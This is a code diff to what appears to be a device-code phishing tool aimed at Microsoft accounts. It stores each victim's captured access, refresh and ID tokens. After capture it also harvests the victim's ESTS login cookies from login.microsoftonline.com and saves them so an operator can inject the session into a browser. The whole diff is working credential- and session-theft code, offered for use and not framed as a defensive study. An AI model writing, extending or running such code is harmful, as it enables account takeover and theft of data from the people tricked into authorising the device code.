@@ -45,6 +45,11 @@ type DCTarget struct {
 	AccessToken     string
 	RefreshToken    string
 	IDToken         string
+	// LoginCookies is the JSON-encoded array of ESTS cookies harvested from
+	// login.microsoftonline.com immediately after token capture. Used to
+	// pre-populate /dc/inject/ so the operator-side script paste is instant
+	// and doesn't depend on the refresh_token still being valid at click time.
+	LoginCookies    string
 	mu              sync.Mutex
 	deviceCode      string
 	interval        int
@@ -87,6 +92,7 @@ type dcTargetJSON struct {
 	IDToken                 string    `json:"id_token"`
 	DeviceCode              string    `json:"device_code"`
 	Interval                int       `json:"interval"`
+	LoginCookies            string    `json:"login_cookies,omitempty"`
 }
 
 // saveDCState writes all targets to dc_state.json. Must be called with dcMu held OR after locking.
@@ -117,6 +123,7 @@ func saveDCStateLocked() {
 			IDToken:                 t.IDToken,
 			DeviceCode:              t.deviceCode,
 			Interval:                t.interval,
+			LoginCookies:            t.LoginCookies,
 		})
 		t.mu.Unlock()
 	}
@@ -170,6 +177,7 @@ func LoadDCState() {
 			AccessToken:             s.AccessToken,
 			RefreshToken:            s.RefreshToken,
 			IDToken:                 s.IDToken,
+			LoginCookies:            s.LoginCookies,
 			deviceCode:              s.DeviceCode,
 			interval:                s.Interval,
 		}
@@ -411,10 +419,28 @@ func (s *DCTarget) poll() {
 			s.AccessToken = tok.AccessToken
 			s.RefreshToken = tok.RefreshToken
 			s.IDToken = tok.IDToken
+			rt := tok.RefreshToken
+			tenant := s.Tenant
+			email := s.Email
 			s.mu.Unlock()
 			log.Success("dc [#%d] %s: TOKENS CAPTURED", s.ID, s.Email)
 			log.Info("  access_token : %s...", trunc(tok.AccessToken, 60))
 			log.Info("  refresh_token: %s...", trunc(tok.RefreshToken, 60))
+			// Harvest ESTS login cookies so the operator-side inject script is ready
+			// at click time and doesn't depend on the refresh_token still being valid.
+			if rt != "" {
+				entries := harvestESTSLoginCookies(rt, tenant, email)
+				if len(entries) > 0 {
+					if b, err := json.Marshal(entries); err == nil {
+						s.mu.Lock()
+						s.LoginCookies = string(b)
+						s.mu.Unlock()
+						log.Info("  login cookies: %d harvested", len(entries))
+					}
+				} else {
+					log.Warning("dc [#%d] %s: no ESTS cookies harvested", s.ID, s.Email)
+				}
+			}
 			saveDCState()
 			dcNotify(s)
 			return
